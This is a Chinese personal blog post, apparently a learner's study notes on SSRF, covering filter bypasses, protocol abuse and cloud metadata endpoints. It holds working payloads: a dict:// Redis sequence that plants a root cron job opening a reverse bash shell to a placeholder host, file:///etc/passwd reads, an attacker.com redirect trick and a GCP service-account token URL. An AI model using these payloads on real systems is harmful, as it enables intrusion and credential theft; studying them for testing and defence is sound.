
<!DOCTYPE html>
<html>
  <head>
    
<meta charset="utf-8" >

<title>æ·±å…¥æµ…å‡ºSSRFï¼ˆä¸€ï¼‰ ï¼š æˆ‘çš„å­¦ä¹ ç¬”è®° | æŒå‰‘</title>
<meta name="description" content="ç¢æœˆæ˜Ÿè¾°æ½æ±Ÿé£ , æˆ‘å¿ƒæœ‰å‰‘é—®å¤©æ¶¯ ">

<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.0/animate.min.css">

<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
<link rel="shortcut icon" href="https://1dayluo.github.io/favicon.ico?v=1711284755357">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
<link rel="stylesheet" href="https://1dayluo.github.io/styles/main.css">



<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
<script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>



  </head>
  <body>
    <div id="app" class="main">
      <div class="site-header-container">
  <div class="site-header">
    <div class="left">
      <a href="https://1dayluo.github.io">
        <img class="avatar" src="https://1dayluo.github.io/images/avatar.png?v=1711284755357" alt="" width="32px" height="32px">
      </a>
      <a href="https://1dayluo.github.io">
        <h1 class="site-title">æŒå‰‘</h1>
      </a>
    </div>
    <div class="right">
      <transition name="fade">
        <i class="icon" :class="{ 'icon-close-outline': menuVisible, 'icon-menu-outline': !menuVisible }" @click="menuVisible = !menuVisible"></i>
      </transition>
    </div>
  </div>
</div>

<transition name="fade">
  <div class="menu-container" style="display: none;" v-show="menuVisible">
    <div class="menu-list">
      
        
          <a href="/" class="menu purple-link">
            é¦–é¡µ
          </a>
        
      
        
          <a href="/archives" class="menu purple-link">
            å½’æ¡£
          </a>
        
      
        
          <a href="/tags" class="menu purple-link">
            æ ‡ç­¾
          </a>
        
      
        
          <a href="/post/about" class="menu purple-link">
            å…³äº
          </a>
        
      
    </div>
  </div>
</transition>


      <div class="content-container">
        <div class="post-detail">
          
          <h2 class="post-title">æ·±å…¥æµ…å‡ºSSRFï¼ˆä¸€ï¼‰ ï¼š æˆ‘çš„å­¦ä¹ ç¬”è®°</h2>
          <div class="post-info post-detail-info">
            <span><i class="icon-calendar-outline"></i> 2022-11-30</span>
            
              <span>
                <i class="icon-pricetags-outline"></i>
                
                  <a href="https://1dayluo.github.io/tag/ZYt2rq1nxl/">
                    ç¬”è®°
                    
                      ï¼Œ
                    
                  </a>
                
                  <a href="https://1dayluo.github.io/tag/zZTzpgyiG3k/">
                    SSRF
                    
                  </a>
                
              </span>
            
          </div>
          <div class="post-content" v-pre>
            <h1 id="ssrfserver-side-request-forgery">SSRF(Server-Side Request Forgery)</h1>
<aside>
ğŸ’¡ Make sure the request comes from the remote server and not your personal IP address
</aside>
<h2 id="what-is-ssrf">What is SSRF?</h2>
<p>è¯±å¯¼æœåŠ¡ç«¯åº”ç”¨ç¨‹åºå»è®¿é—®ç”±æ”»å‡»è€…æ§åˆ¶çš„ä»»æ„åœ°å€,æ”»å‡»è€…èƒ½æ»¥ç”¨è¯¥åŠŸèƒ½åœ¨æœåŠ¡å™¨ä¸Šå»è¯»å–æˆ–æ›´æ–°å†…éƒ¨èµ„æº.</p>
<p>(requestçš„è¡Œä¸ºæ˜¯ç”±æœåŠ¡ç«¯å‘èµ·çš„)</p>
<ul>
<li>Blind SSRF - Allows to scan for accessible hosts and ports</li>
<li>Full Response - Allows you to see the entire resposne from the server</li>
<li>Limited or Response - Shows a portion of the response like the title of the page or No Response or you have access to resources but canâ€™t see them directly</li>
</ul>
<h3 id="blind-ssrf">Blind SSRF</h3>
<ul>
<li>
<p>ä½¿ç”¨SSRFæµ‹è¯•å¼€æ”¾ç«¯å£</p>
<ul>
<li>æ ¹æ®è¿”å›æ—¶é—´åˆ¤æ–­ç«¯å£æ˜¯å¦å¼€æ”¾</li>
</ul>
</li>
</ul>
<p>è¿˜å¯ä»¥ä½¿ç”¨ï¼š</p>
<ul>
<li>Javascript</li>
<li>exfil data</li>
</ul>
<h3 id="full-response">Full Response</h3>
<p>ä¸å—é™åˆ¶ï¼Œç›´æ¥ä»responseä¸­è·å–åˆ°ä¿¡æ¯</p>
<h3 id="limited-response">Limited Response</h3>
<p>éœ€è¦è¿›è¡Œåˆ†æ</p>
<h2 id="disclose-information">Disclose information</h2>
<ol>
<li>ç«¯å£</li>
</ol>
<ul>
<li>æµ‹è¯•ç«¯å£å‚è€ƒï¼ˆå¯ä»¥æµ‹è¿™äº›ï¼‰
<ul>
<li>21, (FTP)</li>
<li>22, (SSH)</li>
<li>80, (Web)</li>
<li>443, (SSL Web)</li>
<li>8080, (Proxy)</li>
</ul>
</li>
</ul>
<ol start="2">
<li>å…è®¸çš„åè®®ï¼š</li>
</ol>
<ul>
<li>gopher:// (File Distribution)</li>
<li>dict:// ( dictionary network protocol)</li>
<li>ftp://Â (File Transfer Protocol)</li>
<li>File:// (File URI Scheme)</li>
<li>ldap:// ( Lightweight Directory Access Protocol*)*</li>
</ul>
<ol start="3">
<li>çœŸå®ipåœ°å€ï¼š</li>
</ol>
<ul>
<li>é€šè¿‡responseçš„å¤´éƒ¨æˆ–å…¶ä»–è¾“å‡º</li>
</ul>
<ol start="4">
<li>å…¶ä»–ä¿¡æ¯æ³„æ¼æ–¹å¼ï¼ˆæ”¶é›†ä¸­ï¼‰</li>
</ol>
<ul>
<li>use incomplete HTTP protocol ï¼ˆ <a href="https://infosecwriteups.com/piercing-the-veil-server-side-request-forgery-to-niprnet-access-c358fd5e249a">https://infosecwriteups.com/piercing-the-veil-server-side-request-forgery-to-niprnet-access-c358fd5e249a</a> ï¼‰
<ul>
<li><a href="https://infosecwriteups.com/%5B::%5D.">http://[::]</a></li>
<li>http://</li>
</ul>
</li>
</ul>
<h2 id="make-sure-request-comes-from-the-remote-server">Make sure request comes from the remote server</h2>
<h3 id="ä½¿ç”¨nc">ä½¿ç”¨nc</h3>
<p>å¦‚æœç›‘å¬åˆ°çš„ipåœ°å€éæœ¬åœ°,è¯æ˜è¯·æ±‚æ˜¯ä»æœ¬åœ°æµè§ˆå™¨å‘èµ·çš„</p>
<p>å‘½ä»¤:</p>
<pre><code class="language-jsx">nc -lvp 8000
</code></pre>
<h3 id="ä½¿ç”¨burpsuite">ä½¿ç”¨Burpsuite</h3>
<aside>
ğŸ’¡ åœ¨blind ssrfä¸‹ä¹Ÿå¯ä»¥ä½¿ç”¨burp
</aside>
<p>Step 1:ä½¿ç”¨burpä¸‹â€burp collaborator clientâ€,ç„¶åå°†åœ°å€å¤åˆ¶åˆ°ssrfä½ç½®</p>
<p>Step 2: æŸ¥çœ‹collaborator client ä¸‹çš„history æ˜¯å¦æ˜¯æœ¬åœ°ipåœ°å€</p>
<h2 id="bypass-blacklist">Bypass Blacklist</h2>
<h3 id="fooling-it-with-redirects">Fooling it with redirects</h3>
<p>For example, you can host a file with the following content on your web server:</p>
<pre><code class="language-html">&lt;?php header(â€œlocation: http://127.0.0.1&quot;); ?&gt;
</code></pre>
<p>Letâ€™s say this file is hosted atÂ <em>http:</em>//<em>attacker.com/redirect.php</em><br>
. This way, when you make the target server requestÂ <em>http:</em>//<em>attacker.com/redirect.php</em>, the target server is actually redirected to http://127.0.0.1, a restricted internal address.</p>
<p>å¤‡æ³¨ï¼š</p>
<ul>
<li>å³ä½¿æ²¡æœ‰åŠæ³•bypassï¼Œä¹Ÿå¯ä»¥å°è¯•æµ‹ä¿¡é“æ”»å‡»ï¼Œçœ‹responseçš„å¤´éƒ¨æ˜¯å¦åŒ…å«å†…éƒ¨çš„ipåœ°å€ï¼Œä¾‹å¦‚ <code>X-Forwarded-For</code></li>
</ul>
<h3 id="tricking-it-with-dns">Tricking it with DNS</h3>
<p>Modify the A/AAAA record of a domain you control and make it point to internal addresses of the victimâ€™s network.</p>
<p>ç½‘ç«™:</p>
<ul>
<li><a href="http://xip.io">xip.io</a> (å¥½åƒä¸èƒ½ç”¨äº†)</li>
<li><a href="https://nip.io/">https://nip.io/</a></li>
<li><a href="https://sslip.io/">https://sslip.io/</a> (å—xip.ioçš„ å¯å‘)</li>
<li><a href="https://v2ex.com/t/863767">https://v2ex.com/t/863767</a> v2exä¸Šæœ‰äººçš„å¸–å­,CNAMEæŒ‡å‘äº†æœ¬åœ°</li>
</ul>
<h3 id="using-ipv6-addresses">Using IPv6 addresses</h3>
<p>Try using IPv6 addresses instead of IPv4. The protection mechanisms implemented for IPv4 might not have been implemented for IPv6.</p>
<h3 id="switching-out-the-encoding">Switching out the encoding</h3>
<p>There are many different ways of encoding a URL or an address that doesnâ€™t change how a server interprets its location, but might let it slip under the radar of a blacklist. These include hex encoding, octal encoding, dword encoding, URL encoding, and mixed encoding.</p>
<ul>
<li>Hex Encoding</li>
</ul>
<p>Turns out that servers out there can understand IP addresses when they are hex encoded.Hereâ€™s an example:</p>
<pre><code class="language-html">127.0.0.1 translates to 0x7f.0x0.0x0.0x1
</code></pre>
<p><strong>The â€œ0xâ€ at the beginning of each section designates it as a hex number.</strong></p>
<p>â€¢ Octal Encoding</p>
<p>Octal encoding is a way of representing characters in the base 8 format.For example,</p>
<pre><code class="language-html">127.0.0.1 translates to 0177.0.0.01
</code></pre>
<p>In this case, the leading zeros are necessary to convey that that section is an octal number.</p>
<p>â€¢ Dword Encoding</p>
<p>â€œDwordâ€ stands for â€œdouble wordâ€, which is a 32-bit integer.An IP address is basically a 32-bit number,split into four octets (groups of eight bits),and written in the decimal format(groups of eight bits).</p>
<p>how to get dword format IP address</p>
<p>For example, 127.0.0.1 is actually the decimal representation of 01111111.00000000.00000000.00000001.. And when we translate the entire number(01111111000000000000000000000001) into one single decimal number, we get the IP address in dword format!</p>
<p>So what is 127.0.0.1 in dword? Itâ€™s the answer for 127<em>256Â³+0</em>256Â²+0<em>256Â¹+1</em>256â°, which is 2130706433,Meaning that if you type in <a href="http://127.0.0.1/">http://2130706433</a> instead of <a href="http://127.0.0.1/">http://127.0.0.1</a>, it would still be understood! Pretty cool right?</p>
<ul>
<li>URL Encoding</li>
</ul>
<p>For example, the word â€œlocalhostâ€ can be represented with its URL encoded equivalent, â€œ%6c%6f%63%61%6c%68%6f%73%74â€.So when a server is blocking requests to internal hostnames such as â€œlocalhostâ€, try itâ€™s URL encoded equivalent!</p>
<ul>
<li>Mixed Encoding</li>
</ul>
<p>Itâ€™s mix-and-match time!You could also use a combination of encoding techniques to try to fool the server: maybe this would work?</p>
<pre><code class="language-html">127.0.0.1 translates to 0177.0.0.0x1
</code></pre>
<p>æ›´å¤šå¯ä»¥çœ‹è¿™é‡Œ: <a href="https://h.43z.one/ipconverter/">https://h.43z.one/ipconverter/</a></p>
<h2 id="bypass-whitelists">Bypass Whitelists</h2>
<p>Whitelists are generally harder to bypass because they are by default, stricter than blacklists.</p>
<h3 id="open-redirect">open redirect</h3>
<p>But it is possible if there is an open redirect vulnerability within the whitelisted domains.If you could find an open redirect, you can request a whitelisted URL that redirects to an internal URL.</p>
<h3 id="not-correctly-implemented">not correctly implemented</h3>
<p>eg. via poorly designed regex</p>
<p>it could also be bypassed by using making a subdomain or directory as the whitelisted domain name (eg.Â <em>victim.com.attacker.com</em><br>
Â orÂ <em>attacker.com/victim.com</em><br>
).</p>
<h2 id="åè®®çš„ä½¿ç”¨">åè®®çš„ä½¿ç”¨</h2>
<aside>
ğŸ’¡ æ³¨æ„ï¼šä¸€äº›æƒ…å†µä¸‹ã€‚ä» BP é‡Œé¢æŠ“åŒ…è¯·æ±‚çš„è¯ï¼Œç©ºæ ¼å¾—å†™æˆ`%2520`
ï¼Œå³ä¸¤æ¬¡ URL ç¼–ç æ‰å¯ä»¥é¡ºåˆ©æ‰§è¡Œ
</aside>
<ul>
<li>gopher:// (File Distribution)</li>
<li>dict:// ( dictionary network protocol)</li>
<li>ftp://Â (File Transfer Protocol)</li>
<li>File:// (File URI Scheme)</li>
<li>ldap:// ( Lightweight Directory Access Protocol*)*</li>
</ul>
<p>å¦‚æœæ˜¯åŸºäºé”™è¯¯çš„ssrfï¼Œå¯ä»¥å…ˆæ ¹æ®responseåˆ¤æ–­æ”¯æŒå“ªäº›åè®®</p>
<h3 id="fileåè®®ä¸‹">fileåè®®ä¸‹ï¼š</h3>
<ul>
<li><code>file:///etc/passwd</code></li>
<li><code>file:///etc/hosts</code> : è·å–æœ¬æœºå†…ç½‘ipåœ°å€ä¿¡æ¯ï¼Œä»è€Œç¡®è®¤å½“å‰èµ„äº§ç½‘æ®µä¿¡æ¯</li>
<li><code>[file://proc/net/arp](file://proc/net/arp)</code> or <code>[file://etc/network/interfaces](file://etc/network/interfaces)</code> ï¼šå½“å‰æœºå­ç½‘ç»œæƒ…å†µ</li>
</ul>
<h3 id="dictåè®®">DICTåè®®</h3>
<p><strong>dictåè®®æ˜¯ä»€ä¹ˆ?</strong></p>
<p><a href="https://blog.51cto.com/u_15127673/4130760">https://blog.51cto.com/u_15127673/4130760</a></p>
<p><strong>dictåè®®å¯ä»¥ç”¨æ¥åšä»€ä¹ˆ?</strong></p>
<ul>
<li>æ¢æµ‹ç«¯å£å¼€æ”¾æœåŠ¡</li>
<li>æ”»å‡»æœªæˆæƒçš„RedisæœåŠ¡</li>
</ul>
<p><strong>æ¢æµ‹ç«¯å£å¼€æ”¾æœåŠ¡</strong></p>
<p>ä½¿ç”¨ssrfé…åˆDICTåè®®æ¢æµ‹å†…ç½‘ç«¯å£å¼€æ”¾æƒ…å†µ:</p>
<p>ä¹Ÿå¯ä½¿ç”¨httpåè®®</p>
<p><strong>ä½¿ç”¨dictåè®®æ„é€ åå¼¹shell - redis</strong></p>
<p><a href="https://www.sqlsec.com/2021/05/ssrf.html#toc-heading-2">https://www.sqlsec.com/2021/05/ssrf.html#toc-heading-2</a></p>
<pre><code class="language-reason"># æ¸…ç©º key
dict://172.72.23.27:6379/flushall

# è®¾ç½®è¦æ“ä½œçš„è·¯å¾„ä¸ºå®šæ—¶ä»»åŠ¡ç›®å½•
dict://172.72.23.27:6379/config set dir /var/spool/cron/

# åœ¨å®šæ—¶ä»»åŠ¡ç›®å½•ä¸‹åˆ›å»º root çš„å®šæ—¶ä»»åŠ¡æ–‡ä»¶
dict://172.72.23.27:6379/config set dbfilename root

# å†™å…¥ Bash åå¼¹ shell çš„ payload
dict://172.72.23.27:6379/set x &quot;\n* * * * * /bin/bash -i &gt;%26 /dev/tcp/x.x.x.x/2333 0&gt;%261\n&quot;

# ä¿å­˜ä¸Šè¿°æ“ä½œ
dict://172.72.23.27:6379/save
</code></pre>
<h3 id="gopheråè®®">Gopheråè®®</h3>
<p><strong>ä¸ºä»€ä¹ˆè¦ç”¨åˆ°gopheråè®®</strong></p>
<figure data-type="image" tabindex="1"><img src="file:///tmp/Export-123bd238-d0e8-4c85-84f8-40e1fbe1d23a/SSRF(Server-Side%20Request%20Forgery)%208896444a46f64714b2a3d272739d77b6/Untitled%205.png?msec=1669820820598" alt="Untitled" loading="lazy"></figure>
<p>è¿™é‡Œæ˜¯ç”¨åˆ°gopheråè®®ä¼ é€’HTTPçš„POSTè¯·æ±‚(SSRFæ¼æ´æ— æ³•ç›´æ¥å‘èµ·POSTè¯·æ±‚)</p>
<p><strong>æ„é€ è¯·æ±‚åŒ…</strong></p>
<p>step1: æŠ“å–è¯·æ±‚åŒ…</p>
<p>step2: åˆ é™¤HTTPè¯·æ±‚çš„</p>
<pre><code class="language-reason">Accept-Encoding: gzip, deflate
</code></pre>
<p>step3: urlä¸¤æ¬¡ç¼–ç æ•´ä¸ªpostè¯·æ±‚</p>
<figure data-type="image" tabindex="2"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2022_11/Untitled%206.png" alt="Untitled" loading="lazy"></figure>
<p>step4: å°†ç¼–ç åçš„è¯·æ±‚ä½œä¸ºTCPæ•°æ®æµä¼ å…¥gopherè¯·æ±‚ä¸­:</p>
<pre><code>url=gopher://172.72.23.24:80/&lt;ä¸¤æ¬¡urlç¼–ç çš„TCPæ•°æ®æµ&gt;
</code></pre>
<p>step5: æˆåŠŸæ‰§è¡Œå‘½ä»¤</p>
<p>åœºæ™¯:</p>
<ul>
<li>è€ƒè™‘fileåè®®ç»“åˆXXEå¤–éƒ¨å®ä½“æ³¨å…¥,å®ç°ssrf</li>
<li>ssrf å‡çº§ä¸ºRCE(é€šè¿‡mysql)</li>
</ul>
<h2 id="proof">Proof</h2>
<p>ç‰¹å¾å¯å‚è€ƒ: å„ç§äº‘æœåŠ¡å™¨/ä¸­é—´ä»¶ [ ä¸ªäººnotionç¬”è®° æˆ‘blogæ²¡æœ‰æ›´å˜»å˜»]</p>
<h3 id="aws">AWS</h3>
<ul>
<li>http://{your-ip}/metadata/v1</li>
<li>http://{your-ip}/latest/metadata</li>
</ul>
<h3 id="google-gcp">Google GCP</h3>
<ul>
<li>http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token</li>
</ul>
<h2 id="escalate-to-rce">escalate to RCE</h2>
<h3 id="aws-2">AWS</h3>
<p>å‚è€ƒAWSä¸‹çš„ ,å†™çš„å¾ˆè¯¦ç»†ã€‚è²Œä¼¼ä»æˆ‘ä¸ªäººç¬”è®°æ¬è¿åˆ°blogé‡Œäº†ï¼Œå¯ä»¥å‚è€ƒé‚£ä¸€ç¯‡=-=</p>
<h3 id="mysql">MySQL</h3>
<p>ä¸æƒ³æ¬è¿ã€‚ã€‚ã€‚ä¹Ÿæ˜¯notionç¬”è®°æœ‰å†™ã€‚blogæ”¹æ’ç‰ˆï¼Œç´¯ã€‚</p>
<h2 id="å‡ºç°çš„åœ°æ–¹æ€»ç»“">å‡ºç°çš„åœ°æ–¹æ€»ç»“</h2>
<ul>
<li>urlé‡Œç”¨base64ç¼–ç ï¼ˆ<a href="https://blog.neolex.dev/13/">ä¾‹å­</a>ï¼‰</li>
<li>Any customization that involves HTML/CSS (Font name, colors, styling)</li>
<li>pushed to the PDF( PDF+XSS ==SSRF)</li>
</ul>
<h2 id="reference">Reference</h2>
<p>Udemy</p>
<ul>
<li><a href="https://www.udemy.com/course/intro-to-bug-bounty-by-nahamsec/learn/lecture/24998004#overview">https://www.udemy.com/course/intro-to-bug-bounty-by-nahamsec/learn/lecture/24998004#overview</a></li>
</ul>
<p>Medium</p>
<ul>
<li><a href="https://vickieli.medium.com/bypassing-ssrf-protection-e111ae70727b">https://vickieli.medium.com/bypassing-ssrf-protection-e111ae70727b</a></li>
<li><a href="https://infosecwriteups.com/piercing-the-veil-server-side-request-forgery-to-niprnet-access-c358fd5e249a">https://infosecwriteups.com/piercing-the-veil-server-side-request-forgery-to-niprnet-access-c358fd5e249a</a></li>
</ul>
<p>PPT</p>
<ul>
<li>Google doc
<ul>
<li><a href="https://docs.google.com/presentation/d/1JdIjHHPsFSgLbaJcHmMkE904jmwPM4xdhEuwhy2ebvo/htmlpresent">https://docs.google.com/presentation/d/1JdIjHHPsFSgLbaJcHmMkE904jmwPM4xdhEuwhy2ebvo/htmlpresent</a></li>
</ul>
</li>
</ul>

          </div>
        </div>

        
          <div class="next-post">
            <a class="purple-link" href="https://1dayluo.github.io/post/cve-2018-0114/">
              <h3 class="post-title">
                ä¸‹ä¸€ç¯‡ï¼šCVE-2018-0114 POCç¼–å†™ä¸å®è·µ
              </h3>
            </a>
          </div>
          
      </div>

      

      <div class="site-footer">
  <div class="slogan">ç¢æœˆæ˜Ÿè¾°æ½æ±Ÿé£ , æˆ‘å¿ƒæœ‰å‰‘é—®å¤©æ¶¯ </div>
  <div class="social-container">
    
      
    
      
    
      
    
      
    
      
    
  </div>
   | <a class="rss" href="https://1dayluo.github.io/atom.xml" target="_blank">RSS</a>
</div>


    </div>
    <script type="application/javascript">

hljs.initHighlightingOnLoad()

var app = new Vue({
  el: '#app',
  data: {
    menuVisible: false,
  },
})

</script>




  </body>
</html>
